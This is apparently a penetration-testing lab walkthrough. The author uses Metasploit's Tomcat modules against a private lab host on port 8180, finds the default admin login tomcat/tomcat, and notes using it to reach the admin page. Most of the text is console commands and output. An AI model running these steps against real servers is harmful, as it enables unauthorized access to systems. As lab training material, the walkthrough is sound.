# Attacking on Port 8180

```
msf > search tomcat
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                                         Disclosure Date  Rank       Description
   ----                                                         ---------------  ----       -----------
   auxiliary/admin/http/tomcat_administration                                    normal     Tomcat Administration Tool Default Access
   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     Tomcat UTF-8 Directory Traversal Vulnerability
   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     Apache Commons FileUpload and Apache Tomcat DoS
   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     Hashtable Collisions
   auxiliary/scanner/http/tomcat_enum                                            normal     Apache Tomcat User Enumeration
   auxiliary/scanner/http/tomcat_mgr_login                                       normal     Tomcat Application Manager Login Utility
   exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     Apache Struts ClassLoader Manipulation Remote Code Execution
   exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Apache Struts 2 Developer Mode OGNL Execution
   exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Apache Tomcat Manager Application Deployer Authenticated Code Execution
   exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
   exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Novell ZENworks Configuration Management Arbitrary File Upload
   post/multi/gather/tomcat_gather                                               normal     Gather Tomcat Credentials
   post/windows/gather/enum_tomcat                                               normal     Windows Gather Apache Tomcat Enumeration


msf > use    auxiliary/admin/http/tomcat_administration                                    normal     Tomcat Administration Tool Default Access
msf auxiliary(tomcat_administration) > show options

Module options (auxiliary/admin/http/tomcat_administration):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT        8180             yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   THREADS      1                yes       The number of concurrent threads
   TOMCAT_PASS                   no        The password for the specified username
   TOMCAT_USER                   no        The username to authenticate as
   VHOST                         no        HTTP server virtual host

msf auxiliary(tomcat_administration) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf auxiliary(tomcat_administration) > run

[*] http://192.168.56.101:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(tomcat_administration) > 



Login to http://192.168.56.101:8180/admin/index.jsp 
tomcat
tomcat


```



